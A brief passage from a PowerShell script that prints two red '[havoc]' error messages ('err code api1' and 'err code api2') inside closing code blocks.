        Write-Host " [havoc] err code api1" -ForegroundColor Red
    }
    Write-Host " [havoc] err code api2" -ForegroundColor Red
}